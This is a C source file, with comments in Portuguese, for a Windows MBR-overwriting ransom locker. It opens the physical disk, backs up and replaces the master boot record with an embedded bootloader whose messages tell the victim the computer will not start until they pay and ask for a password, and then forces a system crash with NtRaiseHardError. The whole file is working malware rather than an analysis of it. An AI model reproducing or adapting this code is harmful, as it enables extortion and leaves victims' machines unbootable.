#include <stdio.h>
#include <Windows.h>

#define SECTOR_SIZE 512
#define MBR_SIG "\x55\xAA"

#pragma comment(lib, "ntdll.lib")

/*
1. Acesso ao HD -> CreateFile
2. Ler a MBR original -> ReadFile
3. Verificar a assinatura de Bootloader
4. Escrevemos o malware na MBR
5. Salvamos a MBR original
*/

unsigned char bootloader[] = "\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x8E\xC0\x8E\xD8\xB8\x01\x13\x31\xDB"
"\xB3\x0F\x8A\x0E\xDE\x7C\x31\xD2\xBD\x81\x7C\xCD\x10\x31\xF6\x3B\x36\x25\x7D\x74\x19\xB4\x01\xCD"
"\x16\x74\xF4\x31\xC0\xCD\x16\xB4\x0E\x31\xDB\xCD\x10\x3A\x84\x1E\x7D\x75\x19\x46\xEB\xE1\xB8\x01"
"\x13\x31\xDB\xB3\x0F\x8A\x0E\x1D\x7D\x31\xD2\xB6\x04\xBD\x02\x7D\xCD\x10\xEB\x18\xB8\x01\x13\x31"
"\xDB\xB3\x0F\x8A\x0E\x01\x7D\x31\xD2\xB6\x04\xBD\xDF\x7C\xCD\x10\xEB\x00\xEB\xFE\xB4\x02\xB0\x02"
"\xB5\x00\xB1\x02\xB6\x00\xB2\x80\xBB\x00\x7E\xCD\x13\xE9\x7F\x01\x4E\x61\x6F\x20\x70\x65\x72\x6D"
"\x69\x74\x69\x72\x65\x69\x20\x6C\x69\x67\x61\x72\x20\x6F\x20\x63\x6F\x6D\x70\x75\x74\x61\x64\x6F"
"\x72\x20\x65\x6E\x71\x75\x61\x6E\x74\x6F\x20\x6E\x61\x6F\x20\x6D\x65\x20\x70\x61\x67\x61\x72\x21"
"\x0A\x0D\x53\x65\x20\x6A\x61\x20\x70\x61\x67\x6F\x75\x2C\x20\x64\x69\x67\x69\x74\x65\x20\x61\x20"
"\x73\x65\x6E\x68\x61\x20\x61\x71\x75\x69\x3A\x20\x00\x5D\x56\x6F\x63\x65\x20\x65\x72\x72\x6F\x75"
"\x21\x20\x50\x6F\x72\x20\x69\x73\x73\x6F\x20\x6E\x61\x6F\x20\x70\x61\x73\x73\x61\x72\x61\x21\x00"
"\x22\x4D\x75\x69\x74\x6F\x20\x62\x6F\x6D\x21\x20\x56\x6F\x63\x65\x20\x70\x61\x73\x73\x6F\x75\x21"
"\x20\x3D\x44\x00\x1B\x52\x61\x66\x61\x65\x6C\x21\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\xB4\x03\xB0\x01\xB5\x00\xB1\x01\xB6"
"\x00\xB2\x80\xBB\x00\x80\xCD\x13\xEA\x00\x00\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, PBOOLEAN WasEnabled);
NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PVOID Parameters, ULONG ResponseOption, PULONG ResponsePointer);

int main() {

	HANDLE hDisk;
	unsigned char cBackup[SECTOR_SIZE];
	unsigned char cInfected[SECTOR_SIZE*2];
	DWORD bytesRead = 0;
	DWORD bytesWritten = 0;
	BOOLEAN privilegeOld = FALSE;
	ULONG response = 0;

	hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDisk == INVALID_HANDLE_VALUE) {
		printf("Falhou o CreateFile\n");
		exit(1);
	}

	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

	if (!ReadFile(hDisk, cBackup, SECTOR_SIZE, &bytesRead, NULL)) {
		printf("Deu ruim em ReadFile\n");
		CloseHandle(hDisk);
		exit(1);
	}

	if (memcmp(&cBackup[SECTOR_SIZE - 2], MBR_SIG, 2)) {
		printf("A assinatura nï¿½o confere\n");
		CloseHandle(hDisk);
		exit(1);
	}


	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

	if (!WriteFile(hDisk, bootloader, SECTOR_SIZE*2, &bytesWritten, NULL)) {
		printf("Deu ruim em WriteFile\n");
		CloseHandle(hDisk);
		exit(1);
	}

	if (!WriteFile(hDisk, cBackup, SECTOR_SIZE, &bytesWritten, NULL)) {
		printf("Deu ruim em WriteFile2\n");
		CloseHandle(hDisk);
		exit(1);
	}

	RtlAdjustPrivilege(19, TRUE, FALSE, &privilegeOld);
	NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &response);

	return(0);

}
